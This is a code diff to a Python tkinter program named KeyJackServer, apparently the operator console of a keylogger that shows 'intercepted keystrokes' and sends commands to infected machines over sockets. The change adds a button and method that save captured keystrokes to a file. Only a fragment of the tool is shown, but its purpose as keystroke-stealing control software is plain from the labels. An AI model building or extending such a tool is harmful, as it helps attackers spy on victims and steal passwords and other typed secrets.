@@ -1,7 +1,7 @@
 import socket
 import threading
 import tkinter as tk
-from tkinter import filedialog, font
+from tkinter import filedialog, font, messagebox
 import os
 
 
@@ -45,6 +45,11 @@ class KeyJackServer:
 
         self.create_text_area(text_frame, "INTERCEPTED KEYSTROKES", 0)
         self.create_text_area(text_frame, "COMMAND CENTER", 1)
+
+        # Save keystrokes button
+        self.save_button = tk.Button(self.root, text="SAVE KEYSTROKES", command=self.save_keystrokes,
+                                     bg='#00FF00', fg='#000000', font=self.cyber_font)
+        self.save_button.pack(pady=10)
 
         # Execute button
         self.execute_button = tk.Button(self.root, text="EXECUTE COMMAND", command=self.handle_sending,
@@ -137,6 +142,20 @@ class KeyJackServer:
 
     def update_status(self, status):
         self.status_label.config(text=f"STATUS: {status}", fg='#00FF00' if status == 'CONNECTED' else '#FF0000')
+
+    def save_keystrokes(self):
+        if not self.intercepted_keystrokes_area.get("1.0", tk.END).strip():
+            messagebox.showinfo("Save Keystrokes", "No keystrokes to save.")
+            return
+
+        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
+        if file_path:
+            with open(file_path, 'w') as f:
+                f.write(self.intercepted_keystrokes_area.get("1.0", tk.END))
+            messagebox.showinfo("Save Keystrokes", f"Keystrokes saved to {file_path}")
+            self.intercepted_keystrokes_area.delete("1.0", tk.END)
+        else:
+            messagebox.showinfo("Save Keystrokes", "Save operation cancelled.")
 
     def on_closing(self):
         if self.server_socket:
